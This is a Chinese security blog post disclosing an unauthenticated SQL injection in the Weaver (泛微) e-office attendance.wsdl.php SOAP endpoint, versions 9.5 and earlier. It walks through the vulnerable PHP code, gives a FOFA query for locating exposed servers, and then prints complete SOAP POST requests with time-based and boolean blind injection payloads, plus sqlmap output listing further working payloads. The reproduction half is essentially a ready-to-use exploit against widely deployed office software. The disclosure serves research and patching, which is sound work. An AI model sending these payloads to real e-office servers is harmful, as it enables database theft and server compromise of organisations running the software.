---
title: "泛微e-office attendance.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-attendance-attendance-wsdl-SaveAttendance-sqli.html
asset_dir: assets/泛微e-office-attendance.wsdl.php-sql注入漏洞
---

# 泛微e-office attendance.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/11 08:22
- 939浏览
- [0评论](#comment)
- 2小时阅读

深入探索

application

数据库

SQL

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE "泛微")E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office attendance.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

深入探索

VPN服务

安全研究报告

网络安全会议

直接看 flow\_xml.php 文件业务逻辑实现

```
<?php

function GetLoginInOut( $UserId, $HandSign )
{
    $AttensApi = new attend( );
    $UserInfo['UserId'] = $UserId;
    $UserInfo['DeptId'] = ( $UserId );
    $UserInfo['PrivId'] = ( $UserId );
    $UserInfo['LoginCheck'] = $HandSign;
    $LoginTime = $AttensApi->GetLoginInOut( $UserInfo );
    return ( $LoginTime );
}

function SaveAttendance( $UserAccounts, $AttendanceTime )
{
    $Attend = new attend( );
    $User = new user( );
    $UserId = $User->getUserIDByUserAccount( $UserAccounts );
    $UserInfo['UserId'] = $UserId;
    $UserInfo['DeptId'] = ( $UserId );
    $UserInfo['PrivId'] = ( $UserId );
    $UserInfo['AttTime'] = $AttendanceTime;
    $AttResult = $Attend->InsertAttendance( $UserInfo );
    return ( $AttResult );
}

include_once( "inc/checkcurrentsession.php" );
include_once( "nusoap/lib/nusoap.php" );
include_once( "api/attend.class.php" );
include_once( "api/user.class.php" );
include_once( "inc/conn.php" );
include_once( "inc/utility_all.php" );
$server = new soap_server( );
$server->soap_defencoding = "UTF-8";
$server->decode_utf8 = false;
$server->configureWSDL( "AttendaceServicewsdl", "urn:AttendaceServicewsdl" );
$server->wsdl->schemaTargetNamespace = "urn:AttendaceServicewsdl";
$server->register( "SaveAttendance", array( "UserAccounts" => "xsd:string", "AttendanceTime" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:AttendaceServicewsdl", "urn:AttendaceServicewsdl#SaveAttendance", "rpc", "encoded", "Get E-office Atten SaveAttendance" );
$server->register( "GetLoginInOut", array( "UserId" => "xsd:string", "HandSign" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:AttendaceServicewsdl", "urn:AttendaceServicewsdl#GetLoginInOut", "rpc", "encoded", "Get E-office Atten GetLoginInOut" );
$server->service( $HTTP_RAW_POST_DATA );
?>
```

深入探索

安全工具开发

技术文章订阅

网络安全课程

这是一个基于 PHP 的 SOAP 服务实现，它提供了两个主要的功能：`SaveAttendance` 和 `GetLoginInOut`

浏览器打开 `/webservice-json/attendance/attendance.wsdl.php` 看下

[![泛微e-office attendance.wsdl.php sql注入漏洞](images/img-001-27894bad3070.webp)](https://image.mrxn.net/72585df8c95548119bd9780d618ff011.webp)

直接在 attendance.wsdl.php 后加上 `?wsdl` 再使用 SoapUI 或者 burp 的Wsdler 插件解析即可得到HTTP请求报文

编程

[![泛微e-office attendance.wsdl.php sql注入漏洞](images/img-002-2a5821fd3f99.webp)](https://image.mrxn.net/fba9e4f8bcc14791a53ebfbc5289fa9a.webp)

## SaveAttendance

先看 `SaveAttendance` 功能实现逻辑

`$UserAccounts` 直接带入 `SaveAttendance` 函数，业务逻辑如下

```
public function getUserIDByUserAccount( $userAccount )
    {
        global $connection;
        $sql = "SELECT USER_ID FROM user WHERE USER_ACCOUNTS='".$userAccount."'";
        $rs = ( $connection, $sql );
        if ( $row = ( $rs ) )
        {
            return $row['USER_ID'];
        }
        else
        {
            return false;
        }
    }
```

`$userAccount` 是直接拼接进SQL语句中执行，无任何过滤，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

## GetLoginInOut

```
function GetLoginInOut( $UserId, $HandSign )
{
    $AttensApi = new attend( );
    $UserInfo['UserId'] = $UserId;
    $UserInfo['DeptId'] = ( $UserId );
    $UserInfo['PrivId'] = ( $UserId );
    $UserInfo['LoginCheck'] = $HandSign;
    $LoginTime = $AttensApi->GetLoginInOut( $UserInfo );
    return ( $LoginTime );
}
```

`$UserId` 和 `$HandSign` 直接带入 `GetLoginInOut` 函数，其业务逻辑如下

代码安全审计

```
public function GetLoginInOut( $UserInfo )
    {
        global $connection;
        $LoginArray = array( );
        $dutyId = $this->getUserDutyType( $UserInfo['UserId'] );
        $dutyArray = $this->getDutyData( $dutyId );
```

将 `$UserInfo['UserId']` 带入 `getUserDutyType` 函数，其业务逻辑实现如下

```
public function getUserDutyType( $userId )
    {
        global $connection;
        $query = "\r\n\t\t\t\t SELECT DUTY_TYPE FROM USER\r\n\t\t\t\t\t WHERE USER_ID = '{$userId}'\r\n\t\t\t\t ";
        $res = ( $connection, $query );
        $Row = ( $res );
        return $Row['DUTY_TYPE'];
    }
```

可以看到和上面的 SaveAttendance 函数注入一样也是 `UserId` 直接拼接进SQL语句中，造成SQL注入漏洞。

漏洞修复方案

# 漏洞复现

## SaveAttendance

```
POST /webservice-json/attendance/attendance.wsdl.php HTTP/1.1
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:AttendaceServicewsdl#SaveAttendance
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082
Content-Length: 559

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:AttendaceServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:SaveAttendance soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserAccounts xsi:type="xsd:string">admin' OR (SELECT 4248 FROM (SELECT(SLEEP(5)))OJuv)-- IPbA</UserAccounts>
         <AttendanceTime xsi:type="xsd:string">2025-02-01</AttendanceTime>
      </urn:SaveAttendance>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office attendance.wsdl.php sql注入漏洞](images/img-003-d2a62167bec3.webp)](https://image.mrxn.net/caf25dbd00904a4c82809432a3bcb99c.webp)

通过时间盲注 成功延时 5 秒。

软件

通过 [sqlmap](https://mrxn.net/tag/sqlmap) 还可测试出其他注入方式如下

```
sqlmap identified the following injection point(s) with a total of 410 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:AttendaceServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:SaveAttendance soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserAccounts xsi:type="xsd:string">admin' RLIKE (SELECT (CASE WHEN (2334=2334) THEN 0x61646d696e ELSE 0x28 END))-- FaCR</UserAccounts>
         <AttendanceTime xsi:type="xsd:string">2025-02-01</AttendanceTime>
      </urn:SaveAttendance>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:AttendaceServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:SaveAttendance soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserAccounts xsi:type="xsd:string">admin' OR (SELECT 4248 FROM (SELECT(SLEEP(5)))OJuv)-- IPbA</UserAccounts>
         <AttendanceTime xsi:type="xsd:string">2025-02-01</AttendanceTime>
      </urn:SaveAttendance>
   </soapenv:Body>
</soapenv:Envelope>
---
```

## GetLoginInOut

```
POST /webservice-json/attendance/attendance.wsdl.php HTTP/1.1
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:AttendaceServicewsdl#GetLoginInOut
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082
Content-Length: 533

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:AttendaceServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetLoginInOut soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserId xsi:type="xsd:string">1' OR (SELECT 4248 FROM (SELECT(SLEEP(5)))OJuv)-- IPbA</UserId>
         <HandSign xsi:type="xsd:string">test</HandSign>
      </urn:GetLoginInOut>
   </soapenv:Body>
</soapenv:Envelope>
```

成功延时 23 秒

网络安全

[![泛微e-office attendance.wsdl.php sql注入漏洞](images/img-004-cdcb91d9c05b.webp)](https://image.mrxn.net/c81823e2160d425388ce14d14c3dcb6f.webp)

以及 sleep 2 秒 实际延时 8 秒

[![泛微e-office attendance.wsdl.php sql注入漏洞](images/img-005-abb2444ce4e2.webp)](https://image.mrxn.net/a7f6b4a354e74e44a30f4567fa827cb1.webp)

以及 sqlmap 的结果

SQL注入防护

```
sqlmap identified the following injection point(s) with a total of 422 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:AttendaceServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetLoginInOut soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserId xsi:type="xsd:string">1' RLIKE (SELECT (CASE WHEN (7677=7677) THEN 1 ELSE 0x28 END))-- EJoT</UserId>
         <HandSign xsi:type="xsd:string">test</HandSign>
      </urn:GetLoginInOut>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:AttendaceServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetLoginInOut soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserId xsi:type="xsd:string">1' AND 6140=BENCHMARK(5000000,MD5(0x6b794775))-- ompp</UserId>
         <HandSign xsi:type="xsd:string">test</HandSign>
      </urn:GetLoginInOut>
   </soapenv:Body>
</soapenv:Envelope>
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#sqlmap](https://mrxn.net/tag/sqlmap)
- [#Java](https://mrxn.net/tag/Java)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.SaveAttendance](#toc-4-1-)
- [4.2.GetLoginInOut](#toc-4-2-)
- [5.漏洞复现](#toc-5-)
- [5.1.SaveAttendance](#toc-5-1-)
- [5.2.GetLoginInOut](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
